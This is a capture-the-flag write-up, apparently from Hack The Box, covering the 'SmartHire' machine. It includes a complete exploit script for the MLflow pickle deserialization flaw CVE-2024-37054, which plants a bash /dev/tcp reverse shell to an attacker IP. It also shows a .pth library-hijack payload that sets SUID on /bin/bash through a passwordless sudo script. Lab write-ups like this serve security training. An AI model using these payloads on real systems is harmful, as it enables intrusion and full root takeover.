---
layout: post
title: SmartHire - CTF
date: 2026-05-19
pid: "5080"
category: "CTFs"
difficulty: "MEDIUM"
description: "Chaining an MLFlow insecure deserialization vulnerability for initial access to exploit a passwordless sudo script via Python library hijacking for root access."
tags: [HTB,Linux,Python,MLFlow]
unlock_date: 2026-10-03 12:00:00 -0700
---
### 1. Overview
This machine involved exploiting an insecure deserialization vulnerability (CVE-2024-37054) in MLFlow to gain initial access. After generating a malicious Python model payload using the `pickle` module, it was uploaded to the vulnerable service and triggered via the main application's resume analyzer to obtain a reverse shell. Privilege escalation was achieved by abusing a passwordless `sudo` configuration for a custom Python script. By leveraging write permissions in a plugin directory to execute a Python library hijacking attack via a `.pth` file, the SUID bit was set on bash, granting root access.
### 2. Recon
Starting off this machine, I ran the standard Nmap service and port scan:
```
╰─❯ nmap -sCV 10.129.29.4 --min-rate 5000 -oN smarthire.nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

This scan found 2 ports:
- **22 SSH**
- **80 HTTP**

The scan also found the domain `smarthire.htb`.  Going to the website prompted me with some AI resume service. The website allowed me to register an account, and log in. After that I noticed the website wanted a `csv` file to train an AI model. Another option was uploading another `csv` file to be analyzed by the AI.

I also started a subdomain scan in the background which found the following:
```
╰─❯ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://smarthire.htb -H "Host: FUZZ.smarthire.htb" -ac
models                  [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 75ms]
```

After adding this host to my hosts file as well, I went to it and was greeted with a login popup. I tried some basic credentials and that `admin:password` worked to login.

Looking at the logo in the top left corner, I found that this subdomain was running MLFlow version `2.14.1`. This version is vulnerable to `CVE-2024-37054`.
### 3. Foothold
This vulnerability exists because this version of MLflow insecurely handles the deserialization of untrusted data via Python's `pickle` module, leading directly to Remote Code Execution (RCE).

To exploit this vulnerability, I first created a simple `csv` file containing information on random people:
```
╰─❯ cat test.csv 
name,skills,experience,education,position_applied,previous_company
John Doe,"Python, Machine Learning, SQL",48,Bachelor's in CS,Data Scientist,TechCorp
Jane Smith,"Java, Spring Boot, PostgreSQL",60,Master's in IT,Backend Developer,Enterprise Inc
```

Uploading this file to the AI training option on the `smarthire.htb` website creates an AI model. I then grabbed the name of the model from `models.smarthire.htb`. After that I wrote the following script to:
- Generate a model
- Inject a payload into that model
- Register the model to MLFlow
- Trigger the payload

```
import os
import pickle
import shutil
import mlflow
from mlflow.tracking import MlflowClient

class DummyModel(mlflow.pyfunc.PythonModel):
    def predict(self, context, model_input):
        return "dummy"

output_dir = "hybrid_pwn"
if os.path.exists(output_dir):
    shutil.rmtree(output_dir)

print("[*] Generating flawless MLmodel directory structure...")
mlflow.pyfunc.save_model(path=output_dir, python_model=DummyModel())

class Exploit:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.15.26/4444 0>&1"'
        print(cmd)
        return (os.system, (cmd,))

print("[*] Overwriting bytecode with raw OS command payload...")
with open(f"{output_dir}/python_model.pkl", "wb") as f:
    pickle.dump(Exploit(), f, protocol=4)

os.environ['MLFLOW_TRACKING_USERNAME'] = 'admin'
os.environ['MLFLOW_TRACKING_PASSWORD'] = 'password'
os.environ['MLFLOW_TRACKING_URI'] = 'http://models.smarthire.htb'

client = MlflowClient()

model_name = "Panda-97393fcb333b-model" 

try:
    run = client.create_run("0")
    run_id = run.info.run_id
    print(f"[*] Targeting Run ID: {run_id}")

    client.log_artifacts(run_id, output_dir, artifact_path="model")
    
    source_uri = f"runs:/{run_id}/model"
    model_version = client.create_model_version(name=model_name, source=source_uri, run_id=run_id)
    
    print(f"[+++] BOOM! Version {model_version.version} registered.")
    print("[!] Ensure your netcat listener is running and hit 'Analyze Resume' on the dashboard.")
    
except Exception as e:
    print(f"[-] Exploit failed: {e}")
```

Before executing the script, I started a netcat listener on my machine. I then ran the script:
```
╰─❯ python3 exploit.py 
[*] Generating flawless MLmodel directory structure...
[*] Overwriting bytecode with raw OS command payload...
bash -c "bash -i >& /dev/tcp/10.10.15.26/4444 0>&1"
[*] Targeting Run ID: 6be2325838ce44e6982bb957b6e56e24
[+++] BOOM! Version 2 registered.
[!] Ensure your netcat listener is running and hit 'Analyze Resume' on the dashboard.
```

Once the script finished, I triggered the payload by uploading the same `test.csv` file to AI analyzer on the `smarthire.htb` website. This resulted in a revshell as the user `svcweb`. I gained persistence by simply adding my SSH key to the authorized_keys in this user's SSH directory.
### 4. Root
Now that I had an SSH shell, I started enumeration for privesc. The first thing I checked was `sudo -l` which revealed I could run sudo without a password:
```
svcweb@smarthire:~$ sudo -l
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

Reading that file, I found that I could exploit this via Python library hijacking:
```
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

Checking the permissions on the `plugins` folder showed that the `devs` group could write files to a folder inside this directory:
```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins$ ls -la
drwxrwxr-x 2 root devs 4096 May 18 22:48 dev
```

Checking my users groups showed that I was also a part of this group:
```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins$ groups
svcweb mlflowweb devs
```

To exploit this, I first created the payload inside the `/opt/tools/mlflow_ctl/plugins/dev` folder:
```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ cat pwn.pth 
import os; os.system("chmod u+s /bin/bash")
```

I then ran the sudo command:
```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
[*] Checking MLflow service status...

[+] MLflow service status: active
[+] MLflow container status: 'Up 2 days'
```

Once that was complete, I could drop into a root shell:
```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ /bin/bash -p
bash-5.1#
```
### 5. Conclusion
Initial access to the system was gained by identifying an MLFlow service running on a subdomain. The service was vulnerable to CVE-2024-37054, which allowed for insecure deserialization via the Python `pickle` module. By crafting a custom exploit script, a malicious model containing a reverse shell payload was registered and subsequently triggered through the main application's analysis feature, resulting in a shell as the `svcweb` user.

During privilege escalation enumeration, it was discovered that `svcweb` could execute a specific Python script (`mlflowctl.py`) as root without a password. Analysis of the script revealed it loaded modules from a `plugins` directory. Because the `svcweb` user belonged to the `devs` group, which had write permissions to the `plugins/dev` directory, a Python library hijacking attack was executed. By dropping a malicious `.pth` file into the directory, executing the sudo command triggered the payload, setting the SUID bit on `/bin/bash` and resulting in a root shell.
